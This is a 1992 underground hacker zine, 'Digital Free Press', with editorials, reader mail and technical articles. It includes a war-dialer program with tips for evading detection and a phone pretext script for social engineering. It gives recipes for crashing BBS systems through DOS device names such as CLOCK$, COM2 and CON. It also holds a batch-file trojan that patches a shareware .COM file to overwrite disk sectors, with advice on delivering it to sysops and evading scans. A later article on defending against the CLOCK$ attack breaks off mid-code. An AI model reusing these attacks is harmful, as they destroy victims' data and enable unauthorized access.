              #########             ############       ######### 
              ###########           ############       ###########
              ####    ####          ####               ####    ####
              ####    ####          ####               ####    ####
              ####    ####          ########           ###########  
              ####    ####          ########           #########
              ####    ####          ####               ####
              ####    ####          ####               ####
              ###########           ####               ####
              #########             ####               #### 

                            DIGITAL FREE PRESS
-------------------------------------------------------------------------------
                    V 1.0        Issue 1.0        January 1992
-------------------------------------------------------------------------------

       * A Publication of The Underground Computing Foundation (UCF) *

            * Send Submissions to: underg!hackers@uunet.uu.net *

              * Editor: Max Cray (underg!max@uunet.uu.net) *

              * BBS: The Underground (401) 841-5607 (v.32) *

------------------------------------------------------------------------------

In this Issue:

    1. _The Future Computer_ Editorial by Max Cray
    2. Phone Number Scanning by GodNet Raider
    3. Fun with the CLOCK$ device driver by The Riddler
    4. Homegrown Trojan by The BBC

------------------------------------------------------------------------------

                           The Future Computer

                              by Max Cray

    In the future, your computer will be a standard household appliance,
like your water heater. It will probably be sitting in a back closet someplace
rarely seen. It will come with your house. Your house will also have a built
in local area network, and there will be terminals in almost every room.
    The distinction between television, radio, and computer networks will
disappear, as the computer becomes the audio, and visual controller. Your
television will be a peripheral to your computer. It will receive from a cable
and feed into your computer, where you will be able to watch TV from any of the
terminals in the house. The terminals will consist of a monitor, probably with
a slot for a floppy disk, and a keyboard. Your stereo will also be a
peripheral to your computer but specialized music media will disappear as
music, movies, and new forms of entertainment will be distributed digitally on
normal computer disks, or through the network.  Your video camera will also
become a computer PERIPHERAL, and the variety of programming will increase
exponentially, as private individuals will be able to create their own
programming to post on the audiovisual network, for all to experience. There
will be national audiovisual networks, and small private networks, similar to
computer bulletin boards of today, but they will be more like personal TV
stations. Those that watch will also contribute to programming, both real time,
and stored. You will be able to have your computer capture any real time event
you missed for storage, for you to later experiencing, editing, etc. You will
be able to send audio, and audiovisual mail, but normal electronic mail will
stay as many will not want to be seen or heard, especially early in the
morning.
    There will be some political decisions to make, as those who control the
national computer networks will become very powerful, and freedom of expression
issues will continue to crop up, as there will be some who call for regulation.
However the power of the national networks will be leveraged by many smaller
networks, which will in fact have gateways to each other.
    There will be centers for the treatment of those addicted to computers.
Your spouse will think it none too soon.
    All the technology I have discussed already exists. The prime factor that
is preventing the changes to society is the cost of the technology. As we all
know, the cost of technology is always dropping. The speed that society
changes is directly related to the speed that the cost of technology drops.

-------------------------------------------------------------------------------

To: hackers@underg
Subject: Scanning.
From: gnr@tsf.UUCP (GodNet Raider)
Organization: The CyberUnderground


                   -=[ Intelligent Phone Number Scanning ]=-

                                     -or-

                /**********************************************/
                /* How to find the number you are looking for */
                /*  without the help of a friendly operator.  */
                /**********************************************/
                
                                - written by -
                                 GodNet Raider
                                    - of -
                             The CyberUnderground

 -=[ "Information is the greatest weapon of power to the modern wizard." ]=-

]----------------------------------------------------------------------------[

Introduction:
-------------

    This phile is written to help in the eternal search for a place to jack
in. It contains tips that will help to make the most use of phone number
scanners and to better target a particular system.


Scanning Tools Needed:
----------------------

    The only tools needed is a computer, phone number scanner software, and a
computer modem. The scanner program is one that dials numbers though your
modem under a given prefix and reports if a carrier (the signal that your 
modem is connected to another modem) was found or not. There are a lot of 
programs out there that will do this function nicely but for you obsessed
prodigies out there the source code for a simple scanner is provided at
the end of this phile.

Scanning Tips:
--------------

    1)  When looking for a particular system (company, school, etc..) keep in
        mind the "+/- ten rule". This rule simply states that most jacks will
        be found within ten (+/-) sequential instances from the normal 
        business phone number. In larger corporations this could be as much
        as twenty (+/-). So to find a site with a business number at 555-1212
        the scanner should start at 555-1202 and try the next twenty
        instances (555-1202 to 555-1222) or ten below and above the base
        number. It should also be noted that in places that had the system
        installed long after it was established this system may not work. But
        due to the great size and expense of some systems they are installed
        day one, so the numbers are assigned to that site (voice, Data, fax,
        etc..) sequentially.

    2)  Also in areas with more than one prefix (746, 747, 748) older sites
        will be found on the lower prefixes (746/747), while newer
        installations will be found on the higher ones (747/748).

    3)  Scanning should be done in small bursts to avoid alerting the PhoCo
        to what you are up to. This means having the scanner only call about
        3 numbers in a burst then wait 5 - 10 minutes for the next burst. It
        is also a good idea to do no more than 50 tries every other day.

    4)  Don't go jacking right after finding a system. It is good practice to
        wait a few days to allow any possible suspicion to wane.   
        It is easer to explain a seemingly one time jacking as "... Sorry,
        must have misdialed a local bbs number. But I did hang up right away
        as not to break any  laws..." Than it is to explain why you
        misdialed the number 50 times in less than 30 minutes.

    5)  Social Engineering is always an last resort. Calling the sites 
        business number between 12:30 and 1:30 will allow for the regular
        sysadmin to leave for lunch leaving an intern or other busy/hurried
        employee (who does not have the time to talk) to answer your inquiry.
        Tell the person on the other end something like the following. 
        
            "Hello, This is linemen Xxxxxxx. I am out here at the junction 
            box and am tracing the line noise problem you reported. The
            number on my service request does not show data equipment on that
            line (give the number you are calling at this time)..."
        
        If all goes well you should get a response like the following...
        
            "Oh it seems you people at the PhoCo have screwed up (everyone
            likes to take an elitist attitude toward the PhoCo. An love to
            point out errors and correct them). You have the business number
            listed as the system number(s). The system number(s) is/are..."


Scanner Source Code:
--------------------

    The following source was written for the IBM pc/clones. As much ansi 'c'
was used as possible, but system specific information (like port i/o) has been
set off into specific functions so that it can be converted to other systems
without having to reinvent the wheel. This program takes information from
the command line and writes output to standard i/o. 

 +---- Cut Here ----+---- Cut Here ----+---- Cut Here ----+---- Cut Here ---+

/*
    scanner.c
    by GodNet Raider
    
        It is assumed that the serial port and modem have already been setup.
        Com 1 & 2 only supported.
*/

#include 
#include 
#include 
#include 
#include 

#define FALSE 0
#define TRUE 1
#define DTR_ON(x) outp(anBCom[x]+4,0x03)
#define DTR_OFF(x) outp(anBCom[x]+4,0x00)
#define CTS(x) inp(anBCom[nPort]+5)&0x0020
#define DATA_READY(x) inp(anBCom[x]+5)&0x0001

char
    *aszError [] =
        {
         "\nUsage: SCANNER    \n"
         "\tPort #  - Serial port number to use.\n"
         "\tPreFix  - Static part of phone number(ie. 1-800-555-, 846-, etc..).
\n"
         "\tStart # - last 4 digits of phone number (ie. 1212, 0065, etc..).\n"

         "\tCount   - Number of instances (single stepped) to scan.\n",
         "\nNumbers are out of range.",
         "\nModem error."
        },
    *aszTarget [] = 
        {
         "connect",
         "busy"
        };

unsigned int
    anBCom [] = 
        {
         0x3f8,
         0x2f8
        };

unsigned int
    Call (unsigned char, char*),
    receive_chr (unsigned long, unsigned char),
    send_chr (unsigned char, unsigned char);

void
    FatalError (int),
    main (int, char**),
    Wait (unsigned long);

void main (argc, argv)
int
    argc;
char
    *argv [];

{
    char
        szWork [128];
    unsigned char
        nPort;
    unsigned int
        nPrsNum,
        nEndNum;
    
    if (argc < 5)
        FatalError (1);
    nPort = (unsigned char) atoi (argv [1]) - 1;
    nEndNum = (nPrsNum = atoi (argv [3])) + atoi (argv [4]);
    if (nPrsNum > 9999 || nEndNum > 9999 || nEndNum <= nPrsNum || nPort > 1)
        FatalError (2);
    while (nPrsNum != nEndNum)
        {
         printf ("%s%04i : ", argv [2], nPrsNum);
         sprintf (szWork, "ATX4Q0V1DT%s%04i\r", argv [2], nPrsNum++);
         printf ("%sCarrier Found\n", (Call (nPort, szWork) ? "" : "No "));
        }
    exit (0);
}

unsigned int Call (nPort, ptDialStr)
unsigned char
    nPort;
char
    *ptDialStr;
{
    unsigned long
        nWait;
    unsigned int
        nTmpCnt,
        nResChr,
        nRetCode = FALSE;
    char
        fCont = TRUE,
        szWork [256] = "",
        *ptWork;

    DTR_ON (nPort);
    Wait (5);
    while (*ptDialStr)
        if (send_chr (*ptDialStr, nPort))
            ptDialStr++;
        else
            if (!(receive_chr (1l, nPort) & 0xff00))
                {
                 outp (anBCom [nPort] + 4, 0x00);
                 FatalError (3);
                }
    ptWork = szWork;
    nWait = time (NULL) + 30;
    while (time (NULL) < nWait && fCont)
        {
         if ((nResChr = receive_chr (1l, nPort)) & 0xff00)
            {
             *(ptWork++) = (char) tolower (nResChr & 0x00ff);
             *ptWork = 0x00;
             for (nTmpCnt = 2; nTmpCnt && fCont; nTmpCnt--)
                if (strstr (szWork, aszTarget [nTmpCnt - 1]))
                    {
                     if (--nTmpCnt)
                        printf ("[%s] ", aszTarget [nTmpCnt]);
                     nRetCode = !nTmpCnt;
                     fCont = FALSE;
                    }
            }
        }
    DTR_OFF (nPort);
    Wait (5);
    return nRetCode;
}

unsigned int send_chr (cCh, nPort)
unsigned char
    cCh,
    nPort;

{
    if (CTS (nPort))
        {
         outp (anBCom [nPort], (int) cCh);
         return TRUE;
        }
    return FALSE;
}

unsigned int receive_chr (nWait, nPort)
unsigned long
    nWait;
unsigned char
    nPort;
{
    nWait += time (NULL);
    while (time (NULL) < nWait)
        if (DATA_READY (nPort))
            return ((inp (anBCom [nPort]) & 0x00ff) + 0x0100);
    return FALSE;
}

void Wait (nWait)
unsigned long
    nWait;
{
    nWait += time (NULL);
    while (time (NULL) < nWait);
}

void FatalError (nErrorNum)
int
    nErrorNum;
{
    printf (aszError [nErrorNum - 1]);
    exit (nErrorNum);
}

 +---- Cut Here ----+---- Cut Here ----+---- Cut Here ----+---- Cut Here ---+

]============================================================================[


Date: 08-03-91 (01:37)              Number:    111 of 124
  To: ALL                           Refer#:    NONE
From:                     Read:      (N/A)
Subj: URGENT                        Status:    PUBLIC MESSAGE
Conf: SYSOPS (5)                    Read Type: GENERAL (-)

*** ATTENTION MS-DOS BASED SYSTEM OPERATORS ***

This message is not a joke, scare, or farce. Read carefully and please
take precautions to prevent potential damage to your system.

A RI sysop has found     [with the help of a local hacker - Ed]
a quite serious problem which appears to be in DOS.
The release of this information has to be done VERY carefully because of
the potential damage which can be done to bbs systems. (maliciously)

IF YOU WANT TO PREVENT DAMAGE TO YOUR SYSTEM:

Disable uploads with the pattern of CLO*.* immediately. If you do not,
you run the risk of not only crashing the board but losing your CMOS
configuration as well. This has been tested with 3 different PCBoard
systems, and they were affected immediately. This bug also affected the
tested computers in a non bbs environment (ie in DOS).

If you would like further information, please arrange a private voice
call or page during the day Saturday. Remember, we have to be very
careful about this information getting out there until this is addressed
and proper precautions have been taken by ALL sysops.

This problem is not a virus, trojan, or a particular file.... It is a
file NAME which causes this corruption of cmos configurations in 80286+
class machines, regardless of the file contents... The actual filename
has been PURPOSELY omitted from this message.  Feel free to distribute
this notification to any other PRIVATE sysop base in the area. Note:
This should not be posted publicly, as it could be a potential security
problem and there are likely others that have not been discovered as of
yet. Please take any necessary precautions to protect your system.

[Editor's note: It's not that hard to run a MEM with the /d flag to find 
the CLOCK$ device driver.]

--------------------------------------------------------------------------

Subject: Phrack 35
From: riddler (The Riddler)

In Phrack 35 a letter from The Dark Lord Sarik Malthus asking for the
justification of hacking: "...in your mind justify the actions of hackers..."
He runs a small bulletin board (running WWIV v.4.20) with an oppressive
fashion. He censors email and very strictly dictates behaviour on his BBS.
He does this, not by any social standards but by his own, which I admit is
admirable...but not when it suppresses FREEDOM OF INFORMATION. The experience
he has had with hackers was primarily with me crashing his board by repeatedly
finding bugs in the WWIV system. I tried every technique explained in
Phrack 34 with no success. However, I am writing to explain a few ways of
harmlessly and temporarily crashing any WWIV and most other BBS packages.

In the MS-DOG environment we are endowd with a few devices such as:
COM1, COM2, AUX, PRN, CON, and CLOCK$, yes there is such a device.

Previous to Dark Lord's upgrade to version 4.20 of WWIV he was running version
4.12.

Here are two ways to crash that system:

Note: Use XMODEM OR ASCII PROTOCOLS, NOT ZMODEM OR YMODEM.

- #1 -

Goto to the file xfer section.
Choose to upload a file.
When propted with the filename, type COM2 (most likely where his modem is).
Finding this device as a file, WWIV asks if you would like to add that
filename to the file database; say yes. 
At that point the file "COM2" will appear as a file available for download.
Download it.
Woooops. A big problem occurs when MS-DOG attempts to read from and write
to the same device name simultaniously. Oh well.
What will most likely happen is either a hardware lock-up or a dos
error message like "Write fult error reading COM2, Abort, Retry...."
Both require that a sysop do something to get the system back up.

- #2 -

Again, goto the file xfer section.
Choose to upload a file
When prompted with the name say you want to upload clock$.zip (ext. does not
matter). Upload any 'ol file on your harddrive, at least 6 bytes or so.
That upload will be fed directly to his clock as a new time setting. The bytes
being rather random, so will the new date/time. When you complete the xfer
WWIV attempts to find out how long you have been xfering for and how much
time you have left for that session and completely keels over.
It will not recover until the sysop has rebooted and reset the clock
or the CMOS-clock (if he has CMOS). 
Clean cut and annoying.

- #3 - (not very thoroughly tested but should word)

Everything the same as in the previous to cracks up to the device name.
This time upload CON.
Upload your favourite ansi bombs and remap often used keys to = 
nasty dos commands or whatever...on the
remote system's keyboard. Hopefully the sysop will have loaded, the 
regular ansi.sys that comes with DOS. This is being fed directly
to his CON -- his keyboard/screen. Try to do this while the sysop
is in bed.

------------------------------------------------------------------------------
But oh no! Version 4.20 of WWIV came out. What will we do now?
It now prevents users from uploading files by the names of devices 
altogether. 
Try these techniques:
------------------------------------------------------------------------------

- #4

Create a zipfile containing a file of no less than 6 bytes (again) with a name
of exactly 6 char's. Then, using your favourite hex editor open your zipfile
and change the two occurences of your chosen filename of the file in the 
zipfile to "ClOck$" (not case sensitive).
After the upload is completed goto the archive menu (a submenu off of the xfer
menu). Choose to extract a file within your zipfile temporarily. Extract the 
clock$ within your freshly uploaded zipfile. WWIV, with the assistance of
PKzip will extract the contained clock$'s contents and spew every byte right 
into the clock$ device again. Clock/cmos screwed again. Locking crashing the
board and locking the computer up. Woops.

#5

Or try this:
Goto the archive menu in xfer section
choose to (A)dd a file to a temporary archive
then, guess what? choose clock$.
WWIV, again with help from PKzip will (this time) read (not write) from
the clock$. Since it will never reach the EOF it is looking for, as it 
would in a regular file WWIV keels over again. In this process messing
the clock up thoroughly. Locking the board and/or computer up.

--------------------------------------------------------------------------
| Uploading clock$ works also, on all PCBoard's versions 14.5 and lower. |
--------------------------------------------------------------------------

I have more BBS crashing techniques if you would like them.
Other BBS's different techniques.

Happy Cracking and a Happy Crashed Year.
>From of The Underground Computing Foundation.
 
The Riddler
underg!riddler@uunet.uu.net

[Editors Note: The UCF does not condone destructive actions. This material
               is distributed to help sysops protect themselves from dangerous
               users like The Riddler.]

------------------------------------------------------------------------------

Subject: Fun...
From: bbc (the bbc)
 
    So you say your bored... Want to do somthing but not sure what...
Well how about crashing a smug WWIV sysop! 
 
    Why not not make a trojan [We mean the horse type] and send it
to them. How you say... Well not that weeeeeee... would condone such
an act..... But for information purposes only we will give you the
method to our maddness...
 
    Step 1:
 
        Make a batch file called "INJECT.BAT" and in it place
        the following commands -
        
        ============================================================
        echo off
        cls
        echo e cs:0100 b4 19 cd 21 b9 09 00 33 d2 cd 26 > ~~temp.~tp
        echo w >> ~~temp.~tp
        echo q >> ~~temp.~tp
        debug %1 < ~~temp.~tp > nul
        erase ~~temp.~tp > nul
        ==============================================================
    
    Step 2:
 
        Then copy a *.COM file into the same directory. Should
        be part of some shareware thing that the sysop would like. 
        With docs an all... would not want them to get suspicious,
        now would we.............
 
    Step 3:
 
         Run the following command from the dos prompt...
 
             INJECT 
 
    Step 4:
 
        Re- zip, arc, lharc, zoo, ect... the thing with it's
        other files... 
 
    Step 5:
 
       Upload the mess to the unsupecting sysop and watch the fun! 
 
 
    See and you thought hacking was hard...... Of course if thay
get smug and start searching for the injected code.... We'll just have
to add extra code (nops' ect) and switching some of the code around...
 
    Next lesson How to bypass Disk protect programs and WWIV door
security.... Dont miss it.... Same bat time! Same bat channel!
 
The BBC
 
-------------------------------------------------------------------------------

[Editors note: In case you missed that BBC hack here it is disassembled:
 
0100 B419    MOV AH,19    'Get Default Drive
0102 CD21    INT 21       'Call DOS
0104 B90900  MOV CX,0009  'Write 9 Sectors
0107 33D2    XOR DX,DX    'Starting as sector 0
0109 CD26    INT 26       'Absolute Disk Write (Oouch!)
 
And thats all she wrote...
 
You can protect yourself from software that does this by using a utility
like MIRROR or IMAGE.]

Keep those letters coming...

                                The End

              #########             ############       #########
              ###########           ############       ###########
              ####    ####          ####               ####    ####
              ####    ####          ####               ####    ####
              ####    ####          ########           ###########
              ####    ####          ########           #########
              ####    ####          ####               ####
              ####    ####          ####               ####
              ###########           ####               ####
              #########             ####               ####

                            DIGITAL FREE PRESS
-------------------------------------------------------------------------------
                    Volume 1.0                Issue 2.0
-------------------------------------------------------------------------------

       * A Publication of The Underground Computing Foundation (UCF) *

            * Send Submissions to: hackers%underg@uunet.uu.net *

              * Editor: Max Cray (max%underg@uunet.uu.net) *

              * BBS: The Underground (401) 847-2603 (v.32) *

------------------------------------------------------------------------------

                    Statement of Purpose and Disclaimer

    The Digital Free Press is an uncensored forum to document current
activities in and of the world of modern technology. It is published under the
premise that it is better to know, rather than not know, so no attempt is made
to hide any information no matter how dangerous it may be. Information is a
double edged sword. It is neither good nor bad, and can be used for either
good or bad. Warning: Some information in this document could be used for
illegal activities. Use at your own risk. Articles are the opinion of the
authors listed, and not of the editor (unless of course the editor wrote
it).

------------------------------------------------------------------------------
In this Issue:

    1. Mail to Max
    2. Editorial: Old 'Hackers' vs. New 'Hackers' - Max Cray
    3. A Tour of The Underground Computing Foundation BBS - Max Cray
    4. Protection of DOS Devices - GodNet Raider
    5. Overwriting Trojan - The BBC
    6. Breaches of Security - The Joker
    7. Getting on Usenet - Max Cray
    8. The BBC's Crash House (Fun with ANSI.SYS) - The BBC

------------------------------------------------------------------------------
Mail to Max:
------------------------------------------------------------------------------
Date: Tue, 31 Dec 91 23:49:32 -0500
From: 
X-Mailer: Mail User's Shell (7.2.2 4/12/91)
To: underg!ccn
Subject: digital free press

While investigating a problem with the mail and uucp queues on my system I
discovered a message from you entitled "DIGITAL FREE PRESS Volume 1 Issue 1".
The majority of this message gave details for activities that I consider to
be either illegal or primarily malicious in nature.  As such, I refuse to
have my computer system be involved in any way in the distribution of this
material.  I realize that some people, perhaps including yourself, might
construe this action as restricting the freedom of the press but rest
assured that this is not the case.  I am in no way usurping your rights to
say anything that you want to say, I am only refusing to help pay for it.

I will phone your system one last time to deliver this letter and then I
will sever the uucp link.  If you wish to discuss this matter with me you
may call me either at work during the day or at home in the evening.
If I do not hear from you within two weeks I will return the unused portion
of your $50.

--

%% Can I be excused, my brain is full. **
--
[Editor's note: Lesson here is be sure you know your upstream sysadmin's
policy on distribution of controversial material. I was able to get the uucp
connection back, but only after agreeing not to distribute DFP anymore
through his site.]
----------------------------------------------------------------------------
Date: Thu, 2 Jan 92 20:39:09 CST
From: 
To: max@underg
Subject: Re: DIGITAL FREE PRESS Volume 1 Issue 1
Newsgroups: alt.hackers
Organization: :noitazinagrO

You obviously have no idea about what alt.hackers is about, to refresh your
memory, enclosed is a copy of an article you should have read earlier, but
knowing your type, probably didn't.  please note that it EXPLICITLY states
that this is not a forum for elitoid DOS pirate dumbshit WEENIES who like to
call themselves "hackers". go back to WWIVnet or Celeritynet or whatever
pirate-net it is that people like you use nowadays, asshole.

[alt.hackers FAQ deleted]

P.S.  Please do not post this type of material here again.
--

--
[Editor's note: How can this person hope to influence people by being so
confrontational? In fact the response I got from the first issue of DFP was
about 90% positive, and there were many requests to be put on the mailing
list. Thanks for your support, and please keep the mail coming!]

------------------------------------------------------------------------------
------------------
| Article 2 of 8 |    EDITORIAL
------------------
                              Real Hackers?

    There is a lot of talk these days about how the word 'hacker' has been
redefined by the press. The theory is that the old hackers, as portrayed in
Steven Levy's excellent book _Hackers: Heroes of the Computer Revolution_,
were good and pure and this breed of hacker dramatized in the press is some
new evil non-hacker terrorist. This is nonsense.

    According to the book, the hacker ethic(paraphrased) is as follows:

    1. Access to computers should be unlimited and total.

    2. All information should be free.

    3. Mistrust Authority - Promote Decentralization.

    4. Hackers should be judged by their hacking.

    5. You can create art and beauty on a computer.

    6. Computers can change your life for the better.

    In pursuit of the hacker ethic these heroes performed various acts that
would not be looked upon favorably in today's anti-hacker society:

Used Equipment Without Authorization (Page 20)
----------------------------------------------

    "    So, without any authorization whatsoever, that is what Peter Sampson
     set out to do, along with a few friends of his from an MIT organization
     with a special interest in model railroading. It was a casual, unthinking
     step into a science-fiction future, but that was typical of the way that
     an odd subculture was pulling itself up by its bootstraps and growing to
     underground prominence-to become a culture that would be the impolite,
     unsanctioned soul of computerdom. It was among the first computer
     hacker escapades of the Tech Model Railroad Club, or TMRC."

Phone Phreaked (Page 92)
------------------------

    "He had programed some appropriate tones to come out of the speaker and
     into the open receiver of the campus phone that sat in the Kluge room.
     These tones made the phone system come to attention, so to speak, and
     dance."

Modified Equipment Without Authorization (Page 96)
--------------------------------------------------

    "    Nelson thought that adding an 'add to memory' instruction would
     improve the machine. It would take _months_, perhaps, to go through
     channels to do it, and if he did it himself he would learn something
     about the way the world worked. So one night Stewart Nelson spontaneously
     convened the Midnight Computer Wiring Society."

Circumvented Password Systems (Page 417)
----------------------------------------

    "Stallman broke the computer's encryption code and was able to get
     to the protected file which held people's passwords. He started
     sending people messages which would appear on screen when they
     logged onto the system:

        'I see you chose the password [such and such]. I suggest that
         you switch to the password "carriage return." It's much
         easier to type, and also it stands up to the principle that
         there should be no passwords.'

    'Eventually I got to the point where a fifth of all the users on
     the machine had the Empty String password.' RMS later boasted.
     Then the computer science laboratory installed a more sophisticated
     password system on its other computer. This one was not so easy for
     Stallman to crack. But Stallman was able to study the encryption
     program, and as he later said, 'I discovered changing one word in
     that program would cause it to print out your password on the system
     console as part of the message that you were logging in.' Since
     the 'system console' was visible to anyone walking by, and its
     messages could easily be accessed by any terminal, or even printed
     out in hard copy, Stallman's change allowed any password to be
     routinely disseminated by anyone who cared to know it. He thought
     the result 'amusing.'

    Certainly these hackers were not anarchists who wanted only to destroy.
They had a personal code of ethics, the hacker ethic to base their behavior
on. In fact the modern hacker has his/her ethics intact. Compare the above
hacker ethic with the hacker ethic found in _Out of the Inner Circle_ by
Bill 'The Cracker' Landreth, a teenager arrested by the FBI (Page 18,60):

    1. Never delete any information you can not easily restore.

    2. Never leave any names on a computer.

    3. Always try to obtain your own information.

    The common denominator to these ethics systems are the respect for
technology, and the personal growth through free access and freedom of
information. Certainly the attitude towards private property is the same.
Accessing and using equipment that you do not own is okay as long as
you do not prevent those who own it from using it, or damage anything.

    With respect to the hacker ethic the hackers mentioned in _Cyberpunk:
Outlaws and Hackers on the Computer Frontier_ by Katie Hafner and John
Markoff were in fact good hackers. If free access, and free information
were the law of the land would Kevin Mitnick have gone to jail? I do not
think so. Sure he got the source code for VMS, but is there any evidence
that he used this information for personal gain, or did he simply use the
information to improve his understanding of the VMS operating system?

    Robert T. Morris's worm program was a clever hack. Of course he 'gronked'
it by programming the replication rate much too fast, but still there is no
evidence that he had any intention of doing harm to the system. It was simply
a computer experiment. Who owns the Internet? Is it some mysterious 'them'
or is it our net? If it is out net, then we should be able to try some stuff
on it, and to heck with 'them' if they can't take a joke.

    Of course the German hackers are a different story. What they got in
trouble for was espionage, and not hacking, which is a breach of faith,
and is hacking for personal gain. However selling Minix to the KGB almost
makes it forgivable...

    It is my contention that hackers did not change. Society changed, and it
changed for the worse. The environment the early hackers were working in
correctly viewed these activities as the desire to utilize technology in a
personal way. By definition hackers believe in the free access to computers
and to the freedom of information. If you do not believe in these principles
you are not a hacker, no matter how technologically capable you are. You
are probable just a tool for the greed society. Current bad mouthing of
hackers is simply snobbery. Rather than cracking down on the modern hacker, we
should reinforce the hacker ethic, a code of conduct not based upon greed and
lust for the almighty dollar, but instead for personal growth through the free
access of computers and information, and a respect for technology.

It is the humane thing to do.

------------------------------------------------------------------------------
------------------
| Article 3 of 8 |
------------------

              A Tour of the Underground Computing Foundation BBS
                                by Max Cray

    I have noticed a lot of people call The UCF BBS and are unable to find
the good stuff, so let me take the opportunity to point out a few of the
high spots. First of all it is connected to the Usenet. Your international
e-mail address would be %underg@uunet.uu.net. With this address
you can subscribe to all the good stuff like Phrack and NIA. There is also
a mailing list: hackers%underg@uunet.uu.net. E-mail me if you want to be
included on the list.
     You can participate in the Usenet newsgroups, of which alt-cud-digest
is a must. alt.dcom.telecom is an outstanding resource for those interested
in the telephone network. There is vast amounts of very technical information
that passes through on a daily basis. Far too much to read it all. Type
USENET at the prompt to see all the newsgroups. Type in the name of the group
you want, and then type the READ command. Type the number of the first
message you want to read. If you call often you will want to configure your
NEW message scan using the JOIN command. Type ? at the prompt to get help.
There is a more local network set up, which has a newsgroup called ri.cug.
This is the Rhode Island Computer Underground, and it contains info on the
local scene around here.
    If you are interested in journals type INFO. I try to keep the latest
issues of NIA, PHRACK, CUD, EFFector, and other journals here. If you are
interested in back issues go into the files section and LOG into the directory
/public/text. You can view or download text philes here. There is also some
stuff of interest in the /public/hacks directory. The /public/comm directory
contains subdirectories for the WAFFLE philes, and UUPC philes that you may
need to connect to the UUCP network.
    Sorry there are no codez as it is an information board and not a pirate
board.

------------------------------------------------------------------------------
------------------
| Article 4 of 8 |
------------------
                      -=[ Protection of DOS devices ]=-

                                     -or-

                  /*******************************************/
                  /* Unarc, Unzip, Lha extract, and be merry */
                  /*         for tomorrow we may lock.       */
                  /*******************************************/

                                - written by -
                                 GodNet Raider
                                    - of -
                             The CyberUnderground

 -=[ "Information is the greatest weapon of power to the modern wizard." ]=-

]----------------------------------------------------------------------------[

Introduction:
-------------

    This phile is written in response to the practice of misusing using
MS-DOS devices (ie.. to make archive bombs). The following will explain the
problem and some of the possible solutions. Also included is an ASM source
that will remap the 'CLOCK$' device to a 'NUL' (basic bit bucket) type
device.

The problem:
------------

  In a never ending attempt of OS designers to mask the inner workings
of system hardware, the idea of device drivers comes into play. A device
driver is basically an attempt to standardize I/O with the systems' hardware.
Thus allowing access to every thing from keyboards to CD ROMS without an
in depth knowledge of the physical hardware involved.

  This ideal is valid and of great help in program development, yet when
the drivers are not well defined there is the tendency for them to cause
more harm then good. A case in point is the 'CLOCK$' device in MS-DOS.

  'CLOCK$' is a driver designed to allow updating of the CMOS clock.
It passes data direct to the CMOS clock with out buffering or any attempt
at error checking. Thereby passing valid data as well as invalid. An with
no internal mechanism to detect an overflow condition/not sending EOF after
a read will tend to hang systems/knock out the date and time stored in the
CMOS clock. This problem has come of use to the hacker community.

  Several methods of the assault have been:

    1)  Uploading 'CLOCK$.*' files to remote systems.

    2)  Using BBS archiveing utilities to create 'CLOCK$.*'
                        files for download.

    3)  Low level disk editing of archive files to rename files
                        in it to 'CLOCK$.*'

Some possible solutions:
------------------------

  Of the solutions available none are complete. There are benefits and
disadvantages to each. Nor is the following a complete list, it is only
an attempt to discus some of the common ones.

  Abstinence:
    Not excepting/expanding archive files on ones system. This is
                the most undesirable but most effective and is only listed
                'for abstinence makes the heart grow fonder'.

  Scanning archives:
    Most archive programs come with a utility to view the files
                stored in a given archive (lha v foobar.lzh). The only real
                drawback is having to take the time to scan archives. This
                does not protect from BBS's that create real time archives,
                extract to check for virus batches (with out looking thought
                the archive first), uploads of 'CLOCK$.*' files, and programs
                that create and write to a 'CLOCK$.*' file.

  Updating programs:
    Getting new versions of programs that watch for 'CLOCK$.*' and
    avoid creating/writing to said file is a problem in that you
    must wait for the author to come up with the fix and have to
                pay for the update. Another reason for software makers to
                release code with their programs.

  TSR protection programs:
    Other than yet another drain on precious RAM and clock time.
                Can only protect from programs that create files though
                interrupts. Pipes and redirects may slip though the cracks.

  LOW LEVEL disk editing of io.sys files:
    Renaming the 'CLOCK$' device is a method that will protect on
                all levels but may cause some programs to hang that use it.
                Also to replace it is not easy for you must reedit the file
                (without moving it). It should also be noted that the new name
                MUST be the same size as the original (6 letters).

  Creation of a new 'CLOCK$' device:
    This offers the protection of the above method with out the
                need of changing OS binary files and to allow/disallow the
                ORIGINAL 'CLOCK$' device by editing the config.sys file
                instead. One disadvantage is that update of the CMOS clock
                though 'CLOCK$' is stoped. Yet the BIOS clock is still
                accessible and the CMOS clock can be updated though the BIOS
                setup routine or programs that write direct to CMOS. Source
                for a simple null mask clock device driver is provided below
                and can be use as a template to create your own 'CLOCK$'
                replacement.

  There are other solutions to this problem not listed here.

Clock$ null device Source Code:
-------------------------------

  The following ASM code is for a DOS device driver that will replace
the existing 'CLOCK$' device when added to the config.sys file
(device=outclock.sys).

  The key points of the device are:

    1)  The line - DW 8080h. This tells the device loader that
                        outclock wishes to replace the present clock device
                        with it's self. This will trap all internal calls and
                        to redirect any calls to the new driver.

    2)  The line - DB 'CLOCK$  '. This will setup the device
                        to trap external access though pipes, indirects, file
                        I/O, and IOCTL's.

    3)  The device strategy is to simply ignore all incoming
                        commands to the device (standard practice for the
                        'NUL' device).

  This driver does not prevent access to the CMOS clock except though
the CLOCK$ device. So it will not effect the running of programs EXCEPT
those that try to update the CMOS clock though the this device.

 +---- Cut Here ----+---- Cut Here ----+---- Cut Here ----+---- Cut Here ---+

CSEG  segment public 'CODE'
    org 0
    assume CS:CSEG, DS:CSEG, ES:CSEG
DEVICE    proc far
      DD 0ffffffffh     ;------------------------------;
      DW 8080h      ; The following 5 definitions  ;
      DW DEV_STRATEGY     ; 18 (bytes) MUST be at offset ;
      DW DEV_INTERRUPT    ; 0 in the binary file.        ;
      DB 'CLOCK$  '     ;------------------------------;
KEEP_ES   DW ?
KEEP_BX   DW ?
FUNCTIONS label word
      DW INIT
      DW CHK_MEDIA
      DW MAKE_BPB
      DW IOCTL_IN
      DW INPUT_DATA
      DW NONDSTRCT_IN
      DW INPUT_STATUS
      DW CLEAR_INPUT
      DW OUTPUT_DATA
      DW OUTPUT_VERIFY
      DW OUTPUT_STATUS
      DW CLEAR_OUTPUT
      DW IOCTL_OUT

DEV_STRATEGY:
      mov CS:KEEP_ES, ES
      mov CS:KEEP_BX, BX
      ret

DEV_INTERRUPT:
      push ES
      push DS
      push AX
      push BX
      push CX
      push DX
      push SI
      push DI
      push BP
      mov AX, CS:KEEP_ES
      mov ES, AX
      mov BX, CS:KEEP_BX
      mov ES:word ptr [BX] + 3, 0000h
      mov AL, ES:[BX] + 2
      shl AL, 1
      xor AH, AH
      lea DI, FUNCTIONS
      add DI, AX
      jmp word ptr [DI]

